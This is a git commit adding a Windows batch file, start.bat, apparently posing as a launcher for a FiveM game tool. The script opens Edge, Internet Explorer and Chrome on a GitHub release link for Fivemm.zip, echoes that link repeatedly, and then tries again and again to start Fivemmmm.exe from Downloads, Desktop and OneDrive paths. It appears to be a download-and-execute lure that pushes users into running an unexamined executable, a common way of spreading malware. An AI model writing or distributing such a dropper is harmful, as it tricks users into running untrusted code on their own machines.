afa044b111b1db38d17ff913e2ccaba6fa82f9e7
Fivemtool5 <96767745+Fivemtool5@users.noreply.github.com>
2021-12-29 10:41:56 +0200

    Add files via upload

---
+++ start.bat
@@ -0,0 +1,52 @@
+@echo off
+start msedge https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+start iexplore https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+start chrome https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+Echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+echo download link 👇👇👇👇👇
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
+echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+start C:\Users\%username%\Downloads\Fivemm.zip\Fivemmmm.exe
+start C:\Users\%username%\Downloads\Fivemm.zip\Fivemmmm.exe
+start C:\Users\%username%\Downloads\Fivemm.zip\Fivemmmm.exe
+echo ~~ ~~ ~~ ~~ ~~ ~~ ~~ ~~ ~~ ~~ ~~ ~~ ~~ ~~ ~~ ~~
+echo *      [Waiting for download]                 *
+echo *      [Waiting for download]                  *
+echo *      [Waiting for download]                   *
+echo *      [Waiting for download]                    *
+echo *      [Waiting for download]                     *
+echo *      [Waiting for download]                      * 
+echo *       *           *         *       *       *     *
+echo ~ edge/iexplore/chrome ~
+echo Starting.....
+start msedge https://github.com/Fivemtool5/Fivem/blob/main/src.md
+start iexplore https://github.com/Fivemtool5/Fivem/blob/main/src.md
+start chrome https://github.com/Fivemtool5/Fivem/blob/main/src.md
+echo Click on Fivemm.zip
+start echo waiting for download, (Click on Fivemm.zip)
+start C:\Users\%username%\Downloads\Fivemm.zip\Fivemmmm.exe
+start C:\Users\%username%\Downloads\Fivemm.zip\Fivemmmm.exe
+start C:\Users\%username%\Downloads\Fivemm.zip\Fivemmmm.exe
+start C:\Users\%username%\Downloads\Fivemm.zip\Fivemmmm.exe
+start C:\Users\%username%\Downloads\Fivemm.zip\Fivemmmm.exe
+start C:\Users\%username%\Downloads\Fivemm.zip\Fivemmmm.exe
+start C:\Users\%username%\Downloads\Fivemm.zip\Fivemmmm.exe
+start C:\Users\%username%\OneDrive\Desktop\Fivemm.zip\Fivemmmm.exe
+start C:\Users\%username%\Desktop\Fivemm.zip\Fivemmmm.exe
+start C:\Users\%username%\%username%\Desktop\Fivemm.zip\Fivemmmm.exe
+echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+pause
